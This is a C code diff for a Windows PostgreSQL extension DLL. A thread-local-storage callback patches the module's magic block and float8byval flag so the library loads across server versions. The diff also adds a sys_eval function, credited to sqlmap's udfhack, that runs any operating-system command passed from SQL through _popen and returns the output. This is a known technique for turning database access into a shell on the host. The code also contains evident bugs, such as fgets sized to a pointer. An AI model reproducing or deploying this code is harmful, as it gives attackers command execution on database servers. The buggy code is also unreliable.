@@ -31,6 +31,9 @@ extern int no_such_variable;
 #define WIN32_LEAN_AND_MEAN
 #define NOCOMM
 
+// _CRT_SECURE_NO_WARNINGS
+#pragma warning(disable:4996)
+
 void NTAPI TlsCallBack(PVOID h, DWORD dwReason, PVOID pv);
 
 #ifdef _M_AMD64
@@ -111,42 +114,158 @@ void NTAPI TlsCallBack(PVOID hModule, DWORD dwReason, PVOID pv)
 					(verInfo->dwFileVersionLS >> 0) & 0xffff
 				);
 
+				// PG_MODULE_MAGIC_DATA Patching. Here the magic happens ;-)
 				int* dMagic = (int *)&Pg_magic_data;
 				elog(NOTICE, "[Entry] PG_MAGIC_FUNCTION_NAME: %d\n", dMagic[1]);
+				unsigned int pgMajor = (verInfo->dwFileVersionMS >> 16) & 0xffff;
+				unsigned int pgMinor = (verInfo->dwFileVersionMS >> 0) & 0xffff;
 
-				//int* dMagic = (int*)PG_MAGIC_FUNCTION_NAME();
-				dMagic[1] = ((verInfo->dwFileVersionMS >> 16) & 0xffff) * 100 + ((verInfo->dwFileVersionMS >> 0) & 0xffff);
+				// EnterpriseDB builds for Windows set FLOAT8PASSBYVAL to false even on 64 bit architectures.
+				// It changed on 9.5+ builds. This small hack is required to keep wide range compatibility on 9.x family
+				// Reference: https://lists.osgeo.org/pipermail/postgis-users/2018-May/042757.html
+				if ((pgMajor == 9 && pgMinor <= 4) || (pgMajor < 9)) {
+					elog(NOTICE, "Version <9.5 detected. Patching FLOAT8PASSBYVAL to false");
+					Pg_magic_data.float8byval = false;
+				}
+				dMagic[1] = (pgMajor * 100 + pgMinor);
 				elog(NOTICE, "[Fixed] PG_MAGIC_FUNCTION_NAME: %d\n", dMagic[1]);
 
 			}
 		}
 	}
-
 	free(verData);
 	return;
 }
 
-void ForcePgMagic() {
-	char ModulePath[MAX_PATH] = { 0 };
-	DWORD hFunction = NULL;
-	HANDLE hModule = NULL;
-	elog(NOTICE, "ForcePgMagic");
-	GetModuleFileNameA(hLibModule, ModulePath, MAX_PATH);
-	Pg_magic_data.float8byval = true;
-	hFunction = (DWORD) load_external_function(ModulePath, "sys_cleanup", false, &hModule);
-	if (hFunction) {
-		elog(NOTICE, "load_external_function [float8byval=%d] return = 0x%x", Pg_magic_data.float8byval, hFunction);
-		FreeLibrary(hModule);
-	} else {
-		Pg_magic_data.float8byval = false;
-		hFunction = (DWORD)load_external_function(ModulePath, "sys_cleanup", false, &hModule);
-		if (hFunction) {
-			elog(NOTICE, "load_external_function [float8byval=%d] return = 0x%x", Pg_magic_data.float8byval, hFunction);
-			FreeLibrary(hModule);
-		}
-	}
+/*
+ Some utility functions borrowed from: sqlmap project (https://github.com/sqlmapproject/udfhack).
+ Source: https://github.com/sqlmapproject/udfhack/blob/master/windows/32/lib_postgresqludf_sys/lib_postgresqludf_sys/lib_postgresqludf_sys.c
+*/
+
+char *text_ptr_to_char_ptr(text *arg)
+{
+	char *retVal;
+	int arg_size = VARSIZE(arg) - VARHDRSZ;
+	retVal = (char *)malloc(arg_size + 1);
+
+	memcpy(retVal, VARDATA(arg), arg_size);
+	retVal[arg_size] = '\0';
+
+	return retVal;
 }
 
+text *chr_ptr_to_text_ptr(char *arg)
+{
+	text *retVal;
+
+	retVal = (text *)malloc(VARHDRSZ + strlen(arg));
+#ifdef SET_VARSIZE
+	SET_VARSIZE(retVal, VARHDRSZ + strlen(arg));
+#else
+	VARATT_SIZEP(retVal) = strlen(arg) + VARHDRSZ;
+#endif
+	memcpy(VARDATA(retVal), arg, strlen(arg));
+
+	return retVal;
+}
+
+FILE *
+compat_popen(const char *command, const char *type)
+{
+	size_t      cmdlen = strlen(command);
+	char       *buf;
+	int         save_errno;
+	FILE       *res;
+
+	/*
+	* Create a malloc'd copy of the command string, enclosed with an extra
+	* pair of quotes
+	*/
+	buf = malloc(cmdlen + 2 + 1);
+	if (buf == NULL)
+	{
+		errno = ENOMEM;
+		return NULL;
+	}
+	buf[0] = '"';
+	memcpy(&buf[1], command, cmdlen);
+	buf[cmdlen + 1] = '"';
+	buf[cmdlen + 2] = '\0';
+
+	res = _popen(buf, type);
+
+	save_errno = errno;
+	free(buf);
+	errno = save_errno;
+
+	return res;
+}
+
+PGDLLEXPORT Datum sys_eval(PG_FUNCTION_ARGS);
+PG_FUNCTION_INFO_V1(sys_eval);
+Datum sys_eval(PG_FUNCTION_ARGS) {
+	text *argv0 = PG_GETARG_TEXT_P(0);
+	text *result_text;
+	char *command;
+	char *result;
+	FILE *pipe;
+	char *line;
+	int32 outlen, linelen;
+
+	command = text_ptr_to_char_ptr(argv0);
+
+	// Only if you want to log
+	elog(NOTICE, "Command evaluated: %s", command);
+
+
+	line = (char *)malloc(1024);
+	result = (char *)malloc(1);
+	outlen = 0;
+
+	result[0] = (char)0;
+
+	pipe = compat_popen(command, "r");
+
+	while (fgets(line, sizeof(line), pipe) != NULL) {
+		linelen = strlen(line);
+		result = (char *)realloc(result, outlen + linelen);
+		strncpy(result + outlen, line, linelen);
+		outlen = outlen + linelen;
+	}
+
+	pclose(pipe);
+
+	if (*result) {
+		result[outlen - 1] = 0x00;
+	}
+
+	result_text = chr_ptr_to_text_ptr(result);
+
+	PG_RETURN_POINTER(result_text);
+}
+
+
+
+/*
+PGDLLEXPORT Datum sys_exec(PG_FUNCTION_ARGS);
+PG_FUNCTION_INFO_V1(sys_exec);
+Datum sys_exec(PG_FUNCTION_ARGS) {
+	text *argv0 = PG_GETARG_TEXT_P(0);
+	int32 result = 0;
+	char *command;
+
+	command = text_ptr_to_char_ptr(argv0);
+
+	Only if you want to log
+	elog(NOTICE, "Command execution: %s", command);
+
+	result = compat_system(command);
+	free(command);
+
+	PG_FREE_IF_COPY(argv0, 0);
+	PG_RETURN_INT32(result);
+}
+*/
 
 PGDLLEXPORT Datum fibbonachi(PG_FUNCTION_ARGS);
 PG_FUNCTION_INFO_V1(fibbonachi);
